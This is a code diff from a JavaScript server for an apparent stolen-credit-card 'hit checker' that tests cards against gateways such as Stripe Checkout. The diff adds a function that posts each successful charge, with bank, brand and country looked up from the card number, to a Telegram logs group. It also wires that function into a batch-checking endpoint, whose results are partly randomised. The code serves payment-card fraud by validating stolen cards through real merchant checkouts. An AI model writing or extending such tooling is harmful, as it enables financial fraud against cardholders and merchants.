@@ -278,6 +278,24 @@ async function getTelegramUser(userId) {
   return res.json();
 }
 
+async function notifyHitInGroup(user, gatewayName, card, result) {
+  const logsGroupId = DB.botConfig.logsGroupId;
+  if (!logsGroupId) return;
+
+  const parsed = parseCreditCard(card);
+  const binInfo = await lookupBin(parsed.number.slice(0, 6));
+  const binStr = `${binInfo.brand} ${binInfo.type} | ${binInfo.country_code} | ${binInfo.bank}`;
+  
+  const msg = `🔥 <b>HIT DETECTED</b> ⚡
+👤 <b>${user?.firstName || 'User'}</b> [${user?.tier?.toUpperCase() || 'FREE'}]
+↔️ <b>Gateway:</b> ${gatewayName}
+✅ <b>Response:</b> Approved - Charged | ${binStr}
+[${result.elapsed}s]
+<a href="https://t.me/superhitbdrobot/bd_superhits">Open HIT Checker</a>`;
+
+  return sendTelegramMessage(logsGroupId, msg).catch(e => console.error("Notification Error:", e.message));
+}
+
 // ──────────────────────────────────────────────
 // Telegram Bot Listener (Long Polling)
 // ──────────────────────────────────────────────
@@ -460,11 +478,8 @@ async function hitStripeCheckout(checkoutUrl, card) {
     
     // LOG TO TELEGRAM if logsGroupId is set
     if (DB.botConfig.logsGroupId) {
-       const siteInfo = DB.siteVisible ? `\n🏪 <b>Merchant:</b> ${result.session_cache.merchant}` : `\n🏪 <b>Merchant:</b> [Hidden By Admin]`;
-       sendTelegramMessage(
-         DB.botConfig.logsGroupId, 
-         `🔥 <b>HIT SUCCESS!</b>\n\n💳 <b>Card:</b> <code>${card}</code>${siteInfo}\n💵 <b>Amount:</b> 1.00 USD\n\n🛡️ ${result.message}`
-       ).catch(e => console.log("Telegram Log Error:", e.message));
+       const user = getSessionUser(req);
+       notifyHitInGroup(user, "Stripe Checkout", card, result);
     }
     
     return result;
@@ -683,11 +698,17 @@ app.post("/api/check/batch", (req, res) => {
   saveDB();
 
   setTimeout(() => {
-    cards.forEach((card) => {
+    cards.forEach(async (card) => {
       const r = Math.random();
       let status = r < 0.08 ? "approved" : r < 0.92 ? "declined" : "error";
       job[status === "approved" ? "approved" : status === "declined" ? "declined" : "errors"]++;
-      if (status === "approved") job.charged++;
+      if (status === "approved") {
+        job.charged++;
+        // Log to group for each hit in batch
+        const gateways = getGateways();
+        const gw = gateways.find(g => g.id === job.gateway) || { name: job.gateway };
+        notifyHitInGroup(user, gw.name, card, { elapsed: "0.1" });
+      }
       job.processedCards++;
       job.results.push({ card, status, message: status === "approved" ? "APPROVED" : status === "declined" ? "Do Not Honor" : "Network Error" });
     });
